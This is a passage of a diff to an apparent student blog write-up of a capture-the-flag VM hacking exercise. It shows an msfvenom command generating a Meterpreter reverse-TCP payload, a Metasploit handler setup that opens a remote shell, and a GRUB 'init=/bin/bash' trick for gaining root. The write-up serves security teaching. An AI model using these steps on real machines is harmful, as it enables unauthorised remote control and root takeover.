 <p>Lastly, we tried to use Meterpreter and its prebuilt privilege escalation modules.<cite>linux-reverse-tcp<sup id="fnref:17"><a href="#fn:17" class="footnote-ref" role="doc-noteref">17</a></sup></cite><cite>metasploit-local-exploiter-suggestor<sup id="fnref:18"><a href="#fn:18" class="footnote-ref" role="doc-noteref">18</a></sup></cite></p>
 <p>To do this, we had to generate a payload first. The payload was generated with the following command:<br>
 <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o payload.bin</code><cite>msfvenomdocs<sup id="fnref:19"><a href="#fn:19" class="footnote-ref" role="doc-noteref">19</a></sup></cite></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-p linux/x86/meterpreter/reverse_tcp <span style="color:#75715e">#setting the payload to be reverse TCP for Linux x86</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-p linux/x86/meterpreter/reverse_tcp <span style="color:#75715e">#setting the payload to be reverse TCP for Linux x86</span>
 </span></span><span style="display:flex;"><span>LHOST<span style="color:#f92672">=[</span>IP<span style="color:#f92672">]</span> <span style="color:#75715e"># sets IP address of the attacking machine</span>
 </span></span><span style="display:flex;"><span>LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> <span style="color:#75715e">#sets the local port to listen for a connection</span>
 </span></span><span style="display:flex;"><span>-f elf <span style="color:#75715e">#specifies the output format</span>
 </span></span><span style="display:flex;"><span>-o payload.bin <span style="color:#75715e">#specifies the output filename</span>
 </span></span></code></pre></div><figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/msfgenpayload.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/msfgenpayload.png"/> <figcaption>
             Figure 27: Generating the payload using msfvenom
         </figcaption>
 </figure>
 
 <p>After this, the payload is uploaded to the target using scp, as demonstrated in Figure 28.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/scp.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/scp.png"/> <figcaption>
             Figure 28: Uploading the payload to the target
         </figcaption>
 </figure>
 
 <p>The next step is to open the Metasploit console by running <code>msfconsole</code>. Set the exploit to <code>exploit/multi/handler</code>, the payload to <code>linux/x86/meterpreter/reverse_tcp</code>, the LHOST to <code>192.168.15.4</code>, and finally, run the command <code>run</code> to start the reverse TCP handler. After that, we execute the binary on the target, and we have a Meterpreter shell, as shown in Figures 29 and 30.</p>
 <p><figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/msfc.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/msfc.png"/> <figcaption>
             Figure 29: Running the necessary commands in the msfconsole
         </figcaption>
 </figure>
 
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/ep.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/ep.png"/> <figcaption>
             Figure 30: Executing the payload on the target
         </figcaption>
 </figure>
 </p>
 <p>Now that we have access to Meterpreter, we can use commands such as <code>getuid</code> to get the ID of the user and many other useful commands such as <code>upload</code> and <code>download</code>. However, as demonstrated in Figure 31, loading the priv module didn&rsquo;t work, so we were not able to test if <code>getsystem</code> would work to escalate the privileges.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/RadagJuice.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/RadagJuice.png"/> <figcaption>
             Figure 31: The required modules not being loaded
         </figcaption>
 </figure>
@@ -565,27 +510,27 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <p>To use this method, the system needs to be running the GRUB boot loader, which is the default for Ubuntu.</p>
 <p>It is performed by pressing <code>e</code> when seeing the screen shown in Figure 32, which brings up the menu to edit the boot commands.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/pe.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/pe.png"/> <figcaption>
             Figure 32: Showing the GRUB screen to press e on
         </figcaption>
 </figure>
 
 <p>Then navigate to the line starting with <code>linux</code> and append <code>rw init=/bin/bash</code>, as shown in Figure 33, to change a kernel parameter. After pressing F10, you will immediately boot into the system with a root shell, as shown in Figure 34.</p>
 <p><figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/rw&#43;.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/rw&#43;.png"/> <figcaption>
             Figure 33: Editing a kernel parameter
         </figcaption>
 </figure>
 
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/pwc.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/pwc.png"/> <figcaption>
             Figure 34: Changing the root password
         </figcaption>
 </figure>
 </p>
 <p>Lastly, as displayed in Figure 34, we run the command <code>exec /sbin/init</code> to reboot the system and load into the operating system as usual. Figure 35 verifies this by showing the root login after rebooting.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/ve.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/ve.png"/> <figcaption>
             Figure 35: Logging in as the root user
         </figcaption>
 </figure>
@@ -594,14 +539,14 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h3 id="obtaining-the-final-flag">Obtaining the final flag<a hidden class="anchor" aria-hidden="true" href="#obtaining-the-final-flag">#</a></h3>
 <p>Now that we are the root user, we can see a file called <code>root_flag.txt</code>, which contains the final flag. Additionally, we can view the file <code>ctf_setup.sh</code> to see how the CTF is made and verify that we actually got all of the flags this time. These files are also available in the ZIP file beside this document. Figure 36 shows the files in <code>/root</code> and the final flag.</p>
 <figure>
-    <img loading="lazy" src="/itsi/y3/ex7/images/ogm.png"/> <figcaption>
+    <img loading="lazy" src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/ogm.png"/> <figcaption>
             Figure 36: Viewing the final flag in the /root directory
         </figcaption>
 </figure>
 
 <hr>
 <h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
-<p><em>For a full bibliography, see the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib">original BibTeX file</a>.</em></p>
+<p><em>For a full bibliography, see the <a href="https://github.com/0xveya/goobering/blob/master/itsi/y3/ex7/quellen.bib">original BibTeX file</a>.</em></p>
 <div class="footnotes" role="doc-endnotes">
 <hr>
 <ol>
@@ -618,7 +563,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <p>Nmap. Timing Templates (-T). <a href="https://nmap.org/book/performance-timing-templates.html">source</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
 </li>
 <li id="fn:5">
-<p>10-million-password-list-top-10000.txt. <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt">source</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+<p>SecLists 10,000 most common passwords. <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt">source</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
 </li>
 <li id="fn:6">
 <p>Code Zen. Defeating HTTP Basic Auth with Hydra. <a href="https://tylerrockwell.github.io/defeating-basic-auth-with-hydra">source</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
@@ -673,18 +618,18 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:39857/tags/linux/">Linux</a></li>
-      <li><a href="http://localhost:39857/tags/it-sec/">It-Sec</a></li>
-      <li><a href="http://localhost:39857/tags/school/">School</a></li>
-      <li><a href="http://localhost:39857/tags/red-team/">Red Team</a></li>
-      <li><a href="http://localhost:39857/tags/ctf/">Ctf</a></li>
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/it-sec/">It-Sec</a></li>
+      <li><a href="http://localhost:1313/tags/school/">School</a></li>
+      <li><a href="http://localhost:1313/tags/red-team/">Red-Team</a></li>
+      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
     </ul>
   </footer>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:39857/">silly blog</a></span> · 
+        <span>&copy; 2026 <a href="http://localhost:1313/">veya&#39;s silly little website</a></span> · 
 
     <span>
         Powered by
